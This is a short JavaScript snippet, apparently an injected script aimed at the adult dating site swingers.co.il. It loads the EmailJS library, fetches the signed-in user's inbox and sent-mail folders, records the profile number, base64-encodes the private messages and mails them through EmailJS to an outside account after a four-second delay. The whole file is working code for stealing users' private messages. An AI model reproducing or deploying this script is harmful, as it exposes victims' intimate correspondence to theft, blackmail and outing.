var script = document.createElement('script')
script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"
document.head.appendChild(script);

setTimeout(() => {
  emailjs.init("user_0z9zeDeCe8tKnLyGb6hLg");
  $.ajax('https://www.swingers.co.il/mailbox.html?mailBox=1&folderType=d').then(function(inbox) {
    $.ajax('https://www.swingers.co.il/mailbox.html?mailBox=2&folderType=d&isSentFolder=1').then(function (sent) {
      // emailjs.send('gmail', 'template_kmOys9Qf', {inbox, sent})
      var profileNum = $('.profileNum').text().split(' - ').pop();
      emailjs.send('gmail', 'template_kmOys9Qf', {
        userlink: 'https://www.swingers.co.il/%D7%97%D7%99%D7%9C%D7%95%D7%A4%D7%99-%D7%96%D7%95%D7%92%D7%95%D7%AA/?customer=' + profileNum,
        inboxfile: btoa(unescape(encodeURIComponent(inbox))),
        sentfile: btoa(unescape(encodeURIComponent(sent)))
      })
    });
  })
}, 4000);

